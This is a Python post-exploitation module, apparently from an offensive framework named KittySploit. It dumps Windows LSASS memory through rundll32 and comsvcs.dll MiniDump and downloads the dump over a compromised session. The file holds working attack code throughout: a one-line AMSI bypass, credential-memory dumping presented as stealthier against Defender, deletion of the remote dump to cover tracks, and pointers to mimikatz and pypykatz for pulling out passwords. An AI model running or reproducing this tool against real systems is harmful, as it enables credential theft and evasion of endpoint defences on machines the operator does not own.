#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Dump LSASS via comsvcs.dll MiniDump (rundll32) — stealthier than direct
MiniDumpWriteDump from PowerShell on many Defender configs.
"""

from kittysploit import *
import os
import re
import time

from lib.post.windows.session import KS_FILE_MARKER, WindowsSessionMixin

_AMSI_INIT_FAILED = (
    "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')"
    ".GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"
)


class Module(Post, WindowsSessionMixin):
    _AUTO_CLEANUP = True
    _LOCAL_OUT = "output"

    __info__ = {
        "name": "Windows LSASS Dump (comsvcs)",
        "description": (
            "Dump LSASS using comsvcs.dll MiniDump via rundll32, then download "
            "the minidump through the session."
        ),
        "author": "KittySploit Team",
        "platform": Platform.WINDOWS,
        "session_type": [SessionType.METERPRETER, SessionType.SHELL],
        "references": [
            "https://attack.mitre.org/techniques/T1003/001/",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
            "cost": 1.5,
            "noise": 0.7,
            "value": 1.1,
            "requires": {"capabilities_any": ["shell"], "capabilities_all": []},
            "chain": {"consumes_capabilities": ["shell"], "produces_capabilities": []},
        },
    }

    out_dir = OptString("", "Remote directory for dump (default: %TEMP%)", False)
    chunk_kb = OptInteger(512, "Chunk size in kilobytes for session reads", False)
    bypass_amsi = OptBool(False, "Attempt AMSI bypass before dump", False)

    def _dump_lsass_comsvcs(self, output_dir: str) -> str:
        dir_q = self.win_ps_single_quote(output_dir.rstrip("\\"))
        script = f"""
$ErrorActionPreference = 'Stop'
$outDir = '{dir_q}'
if (-not (Test-Path -LiteralPath $outDir)) {{
    New-Item -ItemType Directory -Path $outDir -Force | Out-Null
}}
$lsassPid = (Get-Process lsass -ErrorAction Stop).Id
$dump = Join-Path $outDir "lsass_comsvcs_$lsassPid.dmp"
$comsvcs = Join-Path $env:WINDIR 'System32\\comsvcs.dll'
if (-not (Test-Path -LiteralPath $comsvcs)) {{ throw 'comsvcs.dll missing' }}
Write-Output ('{KS_FILE_MARKER}' + $dump)
"""
        meta = self.win_run_powershell(script, timeout=20)
        remote_path = self.win_parse_file_marker(meta)
        if not remote_path:
            print_debug(meta)
            return ""

        match = re.search(r"lsass_comsvcs_(\d+)\.dmp", remote_path)
        pid = match.group(1) if match else ""
        if not pid:
            return ""

        comsvcs = r"C:\Windows\System32\comsvcs.dll"
        self.win_execute(
            f'rundll32.exe "{comsvcs}", MiniDump {pid} "{remote_path}" full',
            timeout=30,
        )
        if self.win_remote_file_size(remote_path) > 0:
            return remote_path
        return ""

    def check(self):
        if not self.win_require_windows():
            return False
        if not self.win_require_powershell():
            return False
        if not self.win_is_admin():
            print_error("Administrator privileges are required.")
            return False
        lsass = self.win_run_powershell(
            "if (Get-Process -Name lsass -ErrorAction SilentlyContinue) { '1' } else { '0' }",
            timeout=8,
        )
        if "1" not in lsass:
            print_error("LSASS process not found.")
            return False
        print_warning("LSASS dumping is likely to trigger EDR — prefer comsvcs over direct PS dump.")
        return True

    def run(self):
        if not self.check():
            raise ProcedureError(FailureType.NotAccess, "comsvcs LSASS dump prerequisites not met")

        if self.bypass_amsi:
            self.win_run_powershell(_AMSI_INIT_FAILED, timeout=10)

        temp_dir = self.win_remote_temp_dir()
        stamp = time.strftime("%Y%m%d_%H%M%S")
        local_dir = os.path.join(self._LOCAL_OUT, f"lsass_comsvcs_{stamp}")
        os.makedirs(local_dir, exist_ok=True)

        print_status("Dumping LSASS via comsvcs.dll...")
        remote_path = self._dump_lsass_comsvcs(temp_dir)
        if not remote_path:
            raise ProcedureError(FailureType.Unknown, "comsvcs dump did not return a file path")

        base = os.path.basename(remote_path.replace("\\", "/")) or "lsass.dmp"
        local_path = os.path.join(local_dir, base)

        if not self.win_pull_file_via_session(
            remote_path,
            local_path,
            chunk_kb=int(self.chunk_kb or 512),
        ):
            if self._AUTO_CLEANUP:
                self.win_execute(f'del /f /q "{remote_path}"', timeout=8)
            raise ProcedureError(FailureType.Unknown, f"Failed to download {remote_path}")

        if self._AUTO_CLEANUP:
            self.win_execute(f'del /f /q "{remote_path}"', timeout=8)

        rel = os.path.join(".", local_path)
        print_success(f"LSASS dump saved: {rel} ({os.path.getsize(local_path)} bytes)")
        print_info("Offline: pypykatz lsa minidump <dump>  or  mimikatz sekurlsa::minidump")
        return True
